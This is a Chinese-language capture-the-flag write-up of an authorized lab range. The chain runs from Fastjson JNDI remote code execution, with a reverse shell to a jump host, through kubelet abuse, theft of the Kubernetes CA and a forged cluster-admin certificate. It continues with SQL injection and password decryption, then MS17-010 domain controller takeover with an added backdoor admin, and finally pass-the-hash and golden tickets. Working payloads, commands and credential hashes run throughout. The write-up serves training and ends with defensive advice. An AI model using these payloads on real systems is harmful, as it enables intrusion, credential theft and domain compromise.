# Rivulet 复盘：从 Fastjson 容器 RCE 到 K8s 集群失守与域控接管

> 本文记录的是 i春秋·春秋云镜授权靶场中的复盘。命令与载荷仅用于该授权环境，不可用于未授权系统。文中跳板机地址已脱敏为 `<JUMP_HOST>`。

这是我打的第一台域控靶机，也是第一台 K8s 靶机。题目写着「简单」，官方标签却把漏洞提权、特权容器、信息泄露和域渗透全勾上了。前后重启了三次：前两次确认是扫描把环境打崩。4 个 flag 最终都拿到了，证据散落在不同实例里。心力憔悴是真的。最后一次崩掉，是 4 个 flag 已经到手之后，复盘时对照别人的 WP，环境又挂了。

| 项目 | 本次记录 |
|------|----------|
| 靶场 | i春秋·春秋云镜 · Rivulet |
| 完整实例 | 公网 `8.147.62.120`（前一残缺实例 `8.130.175.42` 被扫崩） |
| 入口 | `http://<TARGET_IP>:8080`（Spring Boot + Shiro 论坛） |
| 组成 | 入口宿主 1 台（Ubuntu 18.04 + 单节点 k8s）+ 内网 3 台（业务机 `.123`、成员机 `.112`、域控 `.83`） |
| 域 | `MICHA.COM` / `dc01`，SID `S-1-5-21-695962042-539767436-2100334642` |
| 最终路径 | Fastjson 容器 RCE → kubelet 偷 CA → 宿主机 flag1 → SQLi/AES 出 `test` → MS17-010 拿域控 flag4 → 域管回打 `.112` 拿 flag3 |

| flag | 值 | 位置 |
|------|------|------|
| flag1 | `flag1{1fbfaaf6-4810-4239-b8df-b182b3ea11d2}` | 入口宿主根目录 `/flag1` |
| flag2 | `flag2{9f23aa16-33e7-11f1-9508-7e92a294591d}` | `.123` SQLite `secret` 表 |
| flag3 | `flag3{2dfe8280-8a4f-473f-af3c-90bd80aea127}` | `.112` 域管桌面 `flag3.txt` |
| flag4 | `flag4{35bdd403-4c3f-4065-bb24-bd0768479f70}` | `.83` 域管桌面 `flag4.txt` |

flag1 / flag2 在两个不同实例上取值完全一致，域 SID / krbtgt 也是。这批值是镜像内置的，不随实例变化。

![题目页](/content/rivulet/image-01.png)

## 1. 靶机信息与完整拓扑

官方描述就一句话：**Rivulet 考察信息收集。靶场里有复数敏感信息泄露，这些信息会把人送过关键步骤。4 个 flag 平均分布在所有靶机上。**

回头看，这句话比任何漏洞名都准。真正推着走的不是「又一个 Fastjson」「又一个 MS17」，而是每一次泄露都刚好够跨过下一道边界。

![网络逻辑拓扑](/content/rivulet/rivulet-network-topology-image2.5.png)

| 节点 | 地址 | 角色 |
|------|------|------|
| web | `192.168.1.56/24`（ens5，网关 `.1.253`） | 入口宿主，hostname=`web`，单节点 k8s master + docker，`/flag1` |
| shiro-web | `172.17.0.2:8080` | Fastjson 入口容器，挂在 docker0 `172.17.0.1/16` |
| db-123 | `192.168.1.123:22,8000` | Linux 业务机，OpenSSH + FastAPI / SQLite，`flag2` |
| WIN-R4DDIB9732K | `192.168.1.112` | 域成员机，`flag3` |
| dc01 | `192.168.1.83` | 域控 `dc01.MICHA.COM`，`flag4` |

入口宿主还有一块 `ens7 192.168.64.14/24`（网关 `.64.253`）。RST 判定扫过整段，254 个地址只有 `.14` 在，是空网段。别在这边浪费时间。

完整实例的 `.112 / .83 / .123` 和一血 WP 里的地址一一对应。反过来也能解释旧实例为什么对不上：那次**只有两台机**（宿主 + `.123`），`.83` / `.112` 从宿主完全不可达。那次只拿到 flag1 / flag2，还把「flag3 大概在 `.123` 文件系统、那 100 组口令是给 SSH 用的」写进了笔记——这是残缺拓扑上的误判。换实例后第一件事是重新确认拓扑，别把上一局的结论当既成事实。

环境本身还有两个容易误判的点：

1. **虚拟路由做代理 ARP。** `192.168.1.200` 这种肯定不存在的地址，`ip neigh` 也是 `REACHABLE`，MAC 一律 `ee:ff:ff:ff:ff:ff`。ARP / `fscan` 报 alive 都不能当存活证据。可靠判定是 TCP 连一个大概率关闭的端口：秒回 `ConnectionRefused` 说明主机在，一直 timeout 才是不存在。
2. **集群 DNS 原生不可用。** `coredns` 两个 Pod 永远 `Pending`（`node-role.kubernetes.io/master:NoSchedule` 没被容忍）。这是环境原样，不是打坏的。

所有内网动作都走 `ssh -D 1081 root@<入口宿主>` 起的 SOCKS5，再 `proxychains4 -f pc4.conf`。**拿到宿主 root 之前，kali 上没有任何通往靶场内网的 SOCKS**——10250 / 6443 必须从容器里发。

## 2. 攻击链概览

这台最值得写的不是漏洞数量，而是跨了三层边界：容器 → 宿主机 / K8s → 内网域。

```text
8080 论坛：任意 username == password
  → Fastjson 1.2.47 两步 @type → JNDI 反弹到跳板机
  → 容器 root（shiro-web，172.17.0.2）
  → .bash_history 指向 kubelet 10250
  → 匿名 /run 进 kube-apiserver
  → 读挂载的 /etc/kubernetes/pki（ca.key）
  → 伪造 O=system:masters 客户端证书
  → 特权 Pod 写宿主机 authorized_keys
  → flag1 + 宿主 root + SOCKS 进内网
  → .123:8000 /docs 泄露接口
  → PasswdHash UNION → flag2 + AES 解出 101 组口令
  → 离线 NTLM 比对只剩 test
  → MS17-010 打未补丁域控 .83 → flag4
  → 域管 PTH / 黄金票据打 .112 → flag3（非预期捷径）
```

flag3 的预期路线是 `test` RDP 进 `.112` 再本机提权。本次实际走的是一血 WP 的捷径：先拿域管，再回打成员机。后面会把两条路分开写，不包装成独立发现。

## 3. Fastjson 拿下容器

入口就是 `8080` 上的论坛。指纹是 Spring Boot + Thymeleaf，Cookie 里 `rememberMe=deleteMe`，Shiro。目录爆破能看到登录和发帖接口。弱口令比预想更弱：任意 `username == password` 都能过。这是信息泄露 #1，Realm 是 demo 逻辑，不是真鉴权。

```bash
curl -s -m 10 -o /dev/null -w 'root=%{http_code}\n' "http://$TARGET_IP:8080/"
curl -s -c /tmp/ck -X POST "http://$TARGET_IP:8080/doLogin" \
  -d 'username=admin&password=admin' -o /dev/null
curl -s -b /tmp/ck -o /dev/null -w '%{redirect_url}\n' "http://$TARGET_IP:8080/"
# 302 → /      登录成功
# 302 → /login 失败
```

Shiro 常见的 149 个 rememberMe key（CBC / GCM / ECB / 零 IV）全试过，一个不中——**非预期解，别在 rememberMe 上耗时间**。

发帖接口 `/create` 的 `content` 如果传 JSON 对象，会进 Fastjson 的 `@type` 解析。用 DNS 回调确认过：`content` 是对象时会走 `Inet4Address` gadget 触发解析，版本对得上 **1.2.47**。环境摸底：JDK **8u102**（`trustURLCodebase` 默认开，可走远程 codebase），Tomcat 9 / Boot 2，classpath 有 commons-collections 3.x / commons-beanutils / snakeyaml，没有 log4j2 / groovy / javassist。

`JdbcRowSetImpl` 的 JNDI lookup 无论成败都会 `ClassCastException` → 500，所以 HTTP 状态码当不了 oracle。**真信号是响应时间变长，加上跳板机上独立的 LDAP 回调。**

1.2.47 要两步。第一步把类塞进 Fastjson 的类缓存，第二步才能真做 JNDI lookup。只发第二步是 100% 假阳性：请求成功，什么都不会发生。也可以把 `a` / `b` 两个键塞进同一个 `content`，但 1.2.47 的 `JSONObject` 是 `HashMap`，键序不保证，分开两步更稳。

```bash
# ① 预热。200 / 500 都正常，关键是没有 autoType 报错
curl -s -b /tmp/ck -X POST "http://$TARGET_IP:8080/create" \
  -H 'Content-Type: application/json' \
  --data-binary '{"title":"warm","content":{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}}}'

# ② 打。服务端在等 LDAP，时间会到 1–3 秒
curl -s -b /tmp/ck -X POST "http://$TARGET_IP:8080/create" \
  -H 'Content-Type: application/json' \
  --data-binary "{\"title\":\"go\",\"content\":{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://<JUMP_HOST>:8443/Basic/ReverseShell/<JUMP_HOST>/1234\",\"autoCommit\":true}}}" \
  -w '\nfired %{http_code} in %{time_total}s\n' --max-time 60
```

跳板机上跑 `JNDIExploit-1.2-SNAPSHOT.jar`，LDAP `8443`、HTTP 拉 class `8444`。模板用 `Basic/`，不走 `TomcatBypass/` / `GroovyBypass`：新版 Tomcat 的 `BeanFactory` 删了 `forceString`，还要求 `instanceof ResourceRef`，这两条是死路；`TomcatBypass` 的 DN 还会被 base64 截断，前一实例踩过。`-i` 必须填跳板机自己的公网地址，它要拼进返回给靶机的 `javaCodeBase`。安全组要同时放行 **8443、8444、1234**，少一个都打不通。

LDAP URL 里还有一个编码坑：base64 的 `+` 会被解析成空格。旧实例为这个绕开了现成工具，自己用 ecj 编译恶意类、手写 LDAP+HTTP 复用服务器。完整实例改回 `Basic/ReverseShell` 就通了。想执行盲命令而不是弹 shell，可以用 `Basic/Command/<urlencoded>`，或挑一个不含 `+ / =` 的 base64 变体走 `Basic/Command/Base64/`。

收壳不要裸 `nc`。FIFO 可以非交互下发命令：

```bash
ssh jump 'pkill -f "[n]cat -lvnp 1234"; sleep 1
rm -f /tmp/rv.in /tmp/rv.out
mkfifo /tmp/rv.in
(sleep 86400 > /tmp/rv.in &)
setsid ncat -lvnp 1234 --keep-open < /tmp/rv.in > /tmp/rv.out 2>&1 &'

echo 'id; hostname; cat /etc/hosts' | ssh jump 'cat >> /tmp/rv.in'
ssh jump 'cat /tmp/rv.out'
```

这里有两个自杀陷阱。第一，`pkill -f` 的模式文本如果出现在同一条命令行里，会连自己的 shell 一起杀，所以写成 `"[n]cat ..."`。第二，后面不要再补 `< /dev/null`——它会覆盖掉 `< /tmp/rv.in`，ncat 的 stdin 变成空设备，壳就再也收不到命令。`setsid` 已经够用来防 SSH 断开时的 SIGHUP。

结果：`root@52a205b59ba8`，容器 IP `172.17.0.2`，镜像 `shiro-web`，`/app/app.jar` 大约 21MB。容器里 `grep -rlI 'flag{' /` 是空的，flag 不在这一层。

拿到容器之后先看 `.bash_history`。出题人把下一步写在了脸上：

```text
curl -k https://172.17.0.1:10250/pods
```

这是信息泄露 #2。LDAP 不通时先看跳板机 `ss -ltn` 和 JNDI 日志，再看安全组，**不要在靶机上瞎扫**。

## 4. kubelet 匿名 /run：偷 CA 到宿主机

容器里能直连宿主的 `172.17.0.1`。kubelet `10250` **匿名**可读 `/pods`（全部 Pod spec），`/run` 还能直接在任意 Pod 里以 root 执行：

```text
POST https://172.17.0.1:10250/run/<namespace>/<pod>/<container>?cmd=<命令>
```

限制很死：只取第一个 `cmd=`，按空格切 argv，没有 shell、没有管道。`${IFS}` 单独用不够——重定向 token 在解析期就已经切分，`2>` 这类得靠整体包裹。通用绕法是把整段脚本 base64 之后，包一层：

```text
sh -c echo${IFS}<b64>|base64${IFS}-d|sh
```

kubelet 按空格切出来只有 `sh` 和 `-c` 后面那一串；`${IFS}` 由容器侧的 `sh -c` 再展开成空格。容器里没有 `base64 -w0` 也没关系，用 `base64 | tr -d '\n'`。

本实例还有一个小差异：`/run` 返回的是**纯 base64 文本**，不是 JSON。别 `json.loads`，按标记切片、抓最长的 base64 串再解。

通道也要分阶段。宿主 root 之前，kali 到不了 10250 / 6443，请求必须让**容器里的 curl** 去发。`--data-urlencode -G` 让 curl 负责转义，省掉手动处理 `+ / =`：

```bash
ssh jump 'cat >> /tmp/rv.in' <<'EOF'
curl -sk https://172.17.0.1:10250/pods | head -c 3000
EOF

ssh jump 'cat >> /tmp/rv.in' <<'EOF'
b=$(printf %s 'id; hostname' | base64 -w0)
curl -sk -G 'https://172.17.0.1:10250/run/default/shiro-web/shiro-web' \
  --data-urlencode "cmd=sh -c echo\${IFS}$b|base64\${IFS}-d|sh"
echo
EOF
```

注意 `\$`：不让容器里的 sh 提前展开 `${IFS}`。预期能看到 `kube-apiserver-web`（namespace `kube-system`、容器名 `kube-apiserver`）和 `etcd-web`。

```bash
./klet.sh kube-system/kube-apiserver-web/kube-apiserver 'id; ls /etc/kubernetes/pki'
```

![容器内确认 172.17.0.2，并打到 kubelet /pods](/content/rivulet/image-03.png)

![kube-apiserver 里直接列出 /etc/kubernetes/pki，包括 ca.key](/content/rivulet/image-04.png)

`kube-apiserver` 是 static pod，宿主机的 `/etc/kubernetes/pki` 就挂在里面。这是信息泄露 #3，也是这台最致命的一环：容器执行权一旦到手，CA 私钥就到手。顺带还能拿到 `sa.key`，可以自己签 ServiceAccount token，这次用不上。

```bash
# 经 FIFO 从 apiserver 里把 CA 抠出来
ssh jump 'cat >> /tmp/rv.in' <<'EOF'
for f in ca.crt ca.key; do
  b=$(printf %s "cat /etc/kubernetes/pki/$f" | base64 -w0)
  echo "== $f =="
  curl -sk -G 'https://172.17.0.1:10250/run/kube-system/kube-apiserver-web/kube-apiserver' \
    --data-urlencode "cmd=sh -c echo\${IFS}$b|base64\${IFS}-d|sh"
  echo
done
EOF
```

落地后用 openssl 确认：`ca.crt` 的 subject 是 `CN = kubernetes`，`ca.key` 以 `-----BEGIN RSA PRIVATE KEY-----` 开头。然后用 CA 私钥签一张客户端证书，主体写成 `CN=admin, O=system:masters`。`system:masters` 是 k8s 内置超级组，签出来就是 cluster-admin，不需要再找 binding。

```bash
openssl genrsa -out admin.key 2048
openssl req -new -key admin.key -subj "/CN=admin/O=system:masters" -out admin.csr
printf '[ext]\nkeyUsage=critical,digitalSignature,keyEncipherment\nextendedKeyUsage=clientAuth\n' > ext.cnf
openssl x509 -req -in admin.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
  -out admin.crt -days 365 -extfile ext.cnf -extensions ext
```

证书先推进容器，再让容器直连宿主 LAN 上的 `192.168.1.56:6443`。公网 6443 也通，但这一步还没有 SOCKS，从容器发最省事。

```bash
./mkadmin.sh
./push.sh k8s2/admin.crt /tmp/admin.crt
./push.sh k8s2/admin.key /tmp/admin.key
./kc.sh nodes
# GET https://192.168.1.56:6443/api/v1/nodes
# 回 JSON NodeList，节点名 web → 集群 admin 到手
# 401/403 = CN/O 或 ext 写错；连接超时 = 容器到宿主 6443 不通
```

![伪造 system:masters 证书后，6443 返回 NodeList](/content/rivulet/image-05.png)

接下来起一个特权 Pod：`hostNetwork` / `hostPID` / `hostIPC`、`privileged: true`、`hostPath: / → /host`，容忍所有 taint。镜像挑节点上一定有的 `registry.aliyuncs.com/google_containers/etcd:3.3.15-0`，避免 ImagePullBackOff。取巧的地方是把「写公钥」直接写进 Pod 的 `command`，不需要再 exec：

```text
mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh
把 ed25519 公钥追加进 /host/root/.ssh/authorized_keys
chmod 600；id > /host/root/pwnd.txt；sleep 100000
```

`409 AlreadyExists` 说明上一轮没清理干净，直接用现成的 `pwnhost` 即可。起来之后用 `/run` 读宿主机根目录：

```text
flag1{1fbfaaf6-4810-4239-b8df-b182b3ea11d2}
```

公钥已经在 `/root/.ssh/authorized_keys` 里，直接 SSH 进 `web`。宿主机上还能看到一份 `/Notes`（信息泄露 #4），里面是运维事件日志，其中一条写了 `Change the password to a strong one: 2835c8c60e654e7a1a8bd2e51059d9b3`。这串对 root / ubuntu / test / admin / web 都试过，不是 SSH 口令；旧实例在残缺拓扑上把它当成 flag4 线索，走空了。`/home/web/.bash_history` 是个指向别处的符号链接，读不到内容。docker 只有 `shiro-web` 一个业务容器，镜像、卷、overlay2 里都没有第二个 flag。k8s Secret 只有 SA token，etcd 的 data 目录 strings 过也没有 flag。宿主全盘 `grep -rlI 'flag{' /`（排除 `/proc` `/sys` `/dev`）只有 `/flag1`。

```bash
ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_ed25519 root@$TARGET_IP
ssh -i ~/.ssh/id_ed25519 -D 1081 -N -f root@$TARGET_IP
ss -ltnp | grep 1081
proxychains4 -q -f pc4.conf nxc smb 192.168.1.123 192.168.1.112 192.168.1.83
```

代理配错是后面最容易绕晕的地方。有的脚本还硬编码着上一轮的 SOCKS **1080**（frp visitor），这次隧道是 **1081**。`krun.py` / `kapi.sh` 都要改成仓库里的 `pc4.conf`，证书目录改成 `k8s2/`。`api.py` / `bdump.py` 本来就走 1081，不用动。

如果 `ss` 显示 1081 在监听，但 `nxc` 一点输出都没有：那是上一轮留下的隧道还在连**旧公网 IP**。先 `pkill -f 'ssh -D 1081'`，再用新 IP 重建。复盘阶段换过一次实例之后，就踩过这个。

内网三台此时都能摸到：`.123` Linux 业务机、`.112` 域成员、`.83` 域控。

## 5. `.123`：SQLi、AES，和唯一一组真凭据

`http://192.168.1.123:8000/docs` **不是 Swagger**。它是一份自定义 JSON，把四个接口直接列出来。这是信息泄露 #5。

![/docs 直接把 PasswdHash 等接口和示例参数摊开](/content/rivulet/image-06.png)

| 接口 | 参数 | 说明 |
|------|------|------|
| `/api/BasicData` | `username` 模糊 / `workingID` 精确 | 员工信息 |
| `/api/ProjectRecord` | `username` 精确 / `grade` 精确 | 项目记录 |
| `/api/AttendanceRecord` | `username` 模糊 | 考勤 |
| `/api/PasswdHash` | `username` 模糊 | 口令哈希，限 10 条 |

`PasswdHash` 的 `username` 直接拼进类似 `SELECT username,hash FROM login WHERE username LIKE '%<输入>%'` 的语句，UNION 注入、两列。`-- ` 后面必须带空格，否则注释不掉后面追加的 `LIMIT 10`。注入行是追加在正常结果后面的，挑的时候用「第二列固定成 `2`」当标记。

```bash
python3 api.py PasswdHash "' UNION SELECT type||'|'||name||'|'||sql,2 FROM sqlite_master -- "
python3 api.py PasswdHash "' UNION SELECT flag,hint FROM secret -- "
```

其实有**两个** SQLite 文件。主库给 BasicData / ProjectRecord / PasswdHash 共用，表是 `informations`、`login`、`project_evaluation`、`secret`。考勤库只有 AttendanceRecord 的连接能看见，`attendance_2025_01` 到 `_04`，E1001–E1010 的填充数据，没有 flag。

`secret` 表给出：

```text
flag2{9f23aa16-33e7-11f1-9508-7e92a294591d}
hint: Can you decrypt AES?
```

`informations` 每人一把 32 字符 ASCII 的 `key`，`login` 存 `hash` 和密文 `passwd`。AES 这边踩过一次填充：

- 算法是 **AES-256-ECB**
- 密钥就是那 32 个 ASCII 字符，直接当 32 字节 key（`.encode().hex()` 再 `bytes.fromhex()` 是同一件事）
- 密文 `login.passwd` 是 hex，一块 16 字节
- 填充是**零填充**，不是 PKCS7
- 唯一硬校验：`md5(明文) == login.hash`

用 PKCS7 的 `unpad()` 去验证会误报，明文看起来像乱码。`rstrip(b'\x00')` 之后 100/100 的 md5 都能对上。`test` 那把 key 是 `j2noek79kqud0fwdjmgspkks8u2sjux7`。

```python
from Crypto.Cipher import AES
import hashlib

k = keys[user]  # 32 ASCII
pt = AES.new(k.encode(), AES.MODE_ECB).decrypt(bytes.fromhex(ct)).rstrip(b'\x00')
assert hashlib.md5(pt).hexdigest() == h
```

解出来一共 101 组 `用户名|明文口令`。旧实例在这里走错过：把这 101 组拿去喷 `.123` 的 SSH，环境还被扫崩了。md5 全对得上，SSH 却全部失败，当时判断是「环境崩了认证不正常」——完整拓扑上才看清，它们的真正用途是**让你在噪声里捞出唯一的域账号**。离线算 NTLM，零流量：

```python
hashlib.new('md4', b'dh$%gdWKD62a'.encode('utf-16-le')).hexdigest()
# 507f900f67d2a00d4bd77799745689f0
# == MICHA.COM\test
```

| 用户名 | 口令 | 是否真实 |
|------|------|----------|
| `test` | `dh$%gdWKD62a` | 是，NTLM 对得上 |
| 其余 100 组（alex / emma / liam / …） | 随机 | 否。对不上本地 Administrator `42f71379847536edf71764d01e07649f`、域管 `015f5d04d14d053508d14ac11d6496bb`、krbtgt、zarihow `cc4ce384ae49e1f877f6c3bd38fcc7e9` |

`test` 能干什么，把域内和 `.112` 翻了一遍才清楚：

| 检查项 | 结果 |
|------|------|
| AD `memberOf` | 空，只有 Domain Users |
| `.112` 本地组（遍历 `Get-LocalGroupMember`） | **只在 `Remote Desktop Users` 里** |
| `.83` / `.112` 本地管理员 | 都不是 |
| DCSync（`-just-dc-user krbtgt`） | 失败（域管同命令成功，说明确实没权限） |
| WinRM 5985 | 不通，不在 Remote Management Users |

它唯一的能力是 RDP 登录 `.112`。而 `flag3.txt` 的 ACL 是：

```text
NT AUTHORITY\SYSTEM:(F)
BUILTIN\Administrators:(F)
WIN-R4DDIB9732K\Administrator:(F)
```

普通用户——包括 `test`——读不到。这组泄露不是让你喷内网 SSH，是把你领到成员机门口。密码里有 `$`，RDP 时必须单引号。

```bash
proxychains4 -q -f pc4.conf xfreerdp /v:192.168.1.112 /d:MICHA /u:test /p:'dh$%gdWKD62a' /cert:ignore
```

## 6. flag4：MS17-010 拿未补丁的域控

域控 `.83` 是没打补丁的 Server 2016，MS17-010 可用。SOCKS 下有一个很具体的坑：**不要用 proxychains 包 `msfconsole`**。`LD_PRELOAD` 会让 Rex socket 走到 `Rex::ConnectionTimeout`。改用 msf 自己的 `Proxies`：

```ruby
setg Proxies socks5:127.0.0.1:1081
use auxiliary/admin/smb/ms17_010_command
set RHOSTS 192.168.1.83
set COMMAND cmd /c net user N1tols qwer1234! /add
run
set COMMAND cmd /c net localgroup administrators N1tols /add
run
set COMMAND cmd /c reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
run
```

```bash
msfconsole -q -r ms17c.rc
# 不要写成 proxychains4 msfconsole
# 预期三次：192.168.1.83:445 - Command completed successfully!
```

如果报 `Rex::ConnectionTimeout` 或 `socks5: Failed to receive a complete response from the proxy`，先确认 `1081` 是本机端口而不是宿主端口，再确认 msf 是裸跑的，再确认隧道连的是当前实例而不是旧 IP。**别**为了绕过它去直接扫 `.83`。

`dc01` 的 Administrators 同时含 Domain Admins / Enterprise Admins。`nxc smb` 随后报 `(Pwn3d!)`。一血 WP 的路子是 `N1tols` 开 RDP → xfreerdp 登域控桌面 → mimikatz 抓域管 hash。这次省略了 GUI，直接 wmiexec 读文件：

```bash
proxychains4 -q -f pc4.conf nxc smb 192.168.1.83 -u N1tols -p 'qwer1234!'
proxychains4 -q -f pc4.conf impacket-wmiexec -codec gbk 'MICHA/N1tols:qwer1234!@192.168.1.83'
> type C:\Users\Administrator\Desktop\flag4.txt
```

```text
flag4{35bdd403-4c3f-4065-bb24-bd0768479f70}
```

域管 hash 用镜像里烤死的静态值继续横向。

## 7. flag3：实际捷径，和没跑完的预期路线

### 7.1 本次实际打法（非预期）

域密钥也是镜像内置静态值，换实例不变：

| 项 | 值 |
|------|------|
| 域管 `Administrator` NTLM | `015f5d04d14d053508d14ac11d6496bb` |
| `krbtgt` NTLM | `b393c2be124a8b1875d340e492177029` |
| 域 SID | `S-1-5-21-695962042-539767436-2100334642` |

前一实例签发的黄金票据，在新实例上直接能用。这进一步说明 SID / krbtgt 是烤进镜像的。

```bash
# 路 A：PTH
proxychains4 -q -f pc4.conf impacket-wmiexec -codec gbk \
  -hashes :015f5d04d14d053508d14ac11d6496bb MICHA/Administrator@192.168.1.112
> type C:\Users\Administrator\Desktop\flag3.txt

# 路 B：黄金票据
impacket-ticketer -nthash b393c2be124a8b1875d340e492177029 -domain MICHA.COM \
  -domain-sid S-1-5-21-695962042-539767436-2100334642 Administrator
export KRB5CCNAME=Administrator.ccache
proxychains4 -q -f pc4.conf impacket-atexec -k -no-pass \
  MICHA.COM/Administrator@192.168.1.112 \
  'type C:\Users\Administrator\Desktop\flag3.txt'
```

```text
flag3{2dfe8280-8a4f-473f-af3c-90bd80aea127}
```

这条是参考一血 WP 的捷径：先拿域管，再回打 `.112`。不是预期解，也不包装成自己推出来的主线。

### 7.2 预期路线（倒推，本次没实操）

作者把 `MICHA\test` 单独加进 `.112` 的 `Remote Desktop Users`，这是这台上唯一一处非默认配置。结合 flag 文件 ACL，设计好的路应该是：

```text
泄漏表 → 离线 NTLM 比对出 test → RDP 进 .112 → 本机提权 → 管理员 → 桌面 flag3
```

这条路线不是打出来的，是排除加设计痕迹倒推出来的，步骤可以搬走：

1. 把「唯一的真凭据」找出来：对泄漏的 100+ 组口令做离线 NTLM 比对，立刻定位 `test`。比在线喷洒又快又轻。
2. 穷举这个账号的权限：AD 组、每台机本地组、DCSync、WinRM，得出它唯一能做的动作。
3. 看目标 ACL：`icacls` 读 flag 文件，反推必须拿到什么身份。
4. 以管理员身份逐项排除提权点。
5. 找设计痕迹：文件时间戳、用户 profile、缓存凭据、额外安装的软件。

以管理员身份远程把提权点排了一遍：

| 排查项 | 结果 |
|------|------|
| 补丁 | 只有 `KB3192137`（2016-09）和 `KB3213986`（2017-01），2017 年之后裸奔 |
| Print Spooler | Running，且 `HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint\RestrictDriverInstallationToAdministrators = 0x0` |
| AlwaysInstallElevated / Winlogon 自动登录 / Unattend / Panther | 无 |
| 服务 unquoted path / 可改配置服务 | 无。服务 DACL 里没有把 `DC`（SERVICE_CHANGE_CONFIG）授给普通用户 |
| 计划任务 | 全是系统自带 |
| `python3`、`ProgramData\aliyun` 目录权限 | Users 只读，不可写 |
| 额外 | 装了 `C:\Program Files (x86)\python3`（Python 3.11 + pwntools，2026-04-07），像留给「登进去跑利用脚本」用的 |

标准用户能用的就是 PrintNightmare（CVE-2021-1675 / 34527）。`C:\share` 建于 2026-04-07，空、`test` 可读；域账号 `zarihow` 的 profile 和缓存凭据 `$DCC2$10240#zarihow#76d243b57336adbf42acd201ec804034` 落在 2026-04-08——出题人当年就是用域账号 RDP 进 `.112` 自测的，后来才把可登录账号换成泄漏表里的 `test`。

**这次故意没跑 PrintNightmare。** 它会加载打印机驱动，有把 spooler 打挂的风险；环境崩了就不再重启。4 个 flag 已经用捷径拿完，复盘对照别人 WP 的时候环境又挂过一次，就停在「路线和可用提权点锁死」。要跑的话先确认 spooler 在跑、上面那个注册表键是 `0x0`。PrintNightmare 不依赖 `SeLoadDriverPrivilege`。

## 8. 关键知识点

| 要点 | 复盘结论 |
|------|----------|
| 信息泄露 | 这题的主线是泄露，不是堆漏洞。`.bash_history`、`/docs`、static pod 挂载、`/Notes`、101 组口令，每一处都在指定下一步 |
| Fastjson 1.2.47 | 必须两步 `@type` 缓存绕过；少预热就是假阳性。500 不是失败信号，LDAP 回调和耗时才是 |
| JNDI 模板 | 新版 Tomcat 堵死 `TomcatBypass`；`Basic/` 的 DN 不要带会被截断的 base64；`+` 在 LDAP URL 里会变空格 |
| kubelet 10250 | 匿名 `/run` 等于任意 Pod 内 root；再叠 CA 挂载，容器失守就是集群失守。本实例 `/run` 回纯 base64，不要当 JSON 解析 |
| `O=system:masters` | 能签这张证书，就不需要再找 cluster-admin binding |
| SOCKS 时序 | 宿主 root 之前不要强行给 k8s 配代理；脚本里 1080 / 1081 混用会静默连旧实例；msf 用内置 `Proxies`，不要 proxychains 包它 |
| AES 零填充 | 别用 PKCS7 去否定明文；硬校验是 md5 |
| 口令表 | 先离线 NTLM 比对，再决定喷不喷。101 组里只有 `test` 是真的 |
| 残缺拓扑 | 两机实例上的结论（口令给 SSH、flag3 在 `.123`）不能直接带到四机实例 |
| 环境极脆 | 单机全端口 + 高并发也能把域控/成员机扫崩；ARP 在这套虚拟路由上完全不能当存活证据 |

常见坑可以再压成一张速查：

| 现象 | 原因 / 解法 |
|------|-------------|
| `/create` 返回 200 但没 shell | 少了预热那一步 |
| LDAP 连不上 | JNDIExploit 挂了 / 8443 安全组没收 / `-i` 填错了 IP |
| `/run` 的返回不是 JSON | 本实例就是纯 base64 文本 |
| `krun.py` 连不上 10250 | 它硬编码了 1080 的 proxychains conf，改成 `pc4.conf`（1081） |
| `PasswdHash` 注入结果里混着正常行 | 注入行是追加的，用第二列 `== 2` 挑出来 |
| 注入报语法错 | `-- ` 后面必须有空格 |
| AES 解出来是乱码 | 密钥当 32 字节用、模式 ECB、填充是零填充 |
| msf 报 `Rex::ConnectionTimeout` | 别用 proxychains 包 msfconsole |
| `pkill -f` 把自己的 shell 杀了 | 模式改写成 `"[n]cat ..."` |
| 1081 在听但 nxc 没输出 | 隧道还连着上一轮的公网 IP |

## 9. 复盘

Rivulet 把我按在信息收集上打：容器史里的一条 curl、业务机自己公布的接口文档、每人一把却几乎全是填充的口令表。漏洞都是旧的，难的是认出哪一条泄露才是过门的钥匙，以及克制住「先把内网翻一遍」的手。

扫崩这件事要单独记。

**第一起**在旧实例：`fscan -h 192.168.1.0/24` 加自写 600 线程全端口之后，靶机内部劣化，已经 md5 校验正确的 100 组 SSH 口令全部登不进去。当时还只有两台机，`.83` / `.112` 根本摸不到，于是把 flag3 误判到 `.123` 文件系统上。

**第二起**在完整四机环境：只对单台 `.112` 跑了 `1–65535`、120 线程、0.7s 超时的全端口，大约 3 分钟。扫描结束后 2 到 4 分钟内 `.83` 和 `.112` 一起失联，再也没回来。用会话时间戳对齐（扫描 03:08:39–03:11:33，两机 03:13:50→03:16:30 掉线），入口宿主开机时间早于失联时刻——不是平台重启，是自己扫崩的。教训是：「激进」不只是 `/24` 扇出，**单机全端口加高并发同样致命**。并发压到 ≤30，端口范围先窄后宽。怀疑搞挂了，在入口机跑 `uptime` / `who -b`，再对照自己命令的时间线。

**最后一次**不是打 flag 打崩的。4 个 flag 已经用捷径拿完，复盘时对照别人的 WP，环境又挂了。PrintNightmare 因此没实操：加载打印机驱动有把 spooler 打挂的风险，而这时候已经没有下一局。

还有两条可以搬走的判断习惯。第一，拿到关键凭据要立刻用掉，别先做完整内网画像。第二，泄漏的大批口令先做离线比对，再决定是否在线验证——`test` 是对 NTLM 哈希对出来的，不是喷出来的。旧实例那句「下次一进去第一时间喷 SSH」，在完整拓扑上是错的。

flag1 / flag2 跨实例一字不差，黄金票据跨实例也能用。题目不靠随机化防作弊。对复盘友好，对「再开一次」不友好。所以这篇写到这里：4 个 flag 齐了，预期的 PrintNightmare 只锁死到注册表和补丁清单，拓扑图用生成图把三层边界摊开。

## 10. 防守视角

1. kubelet `10250` / apiserver `6443` 不要暴露到公网；kubelet 必须 `--anonymous-auth=false`，授权走 Webhook。
2. static pod 不要把宿主机 `/etc/kubernetes/pki` 挂进容器。这是本靶场最致命的一环。
3. 业务侧：关掉 Fastjson autotype 或升级到安全版本；Shiro 不要用「用户名等于密码」的 demo Realm。
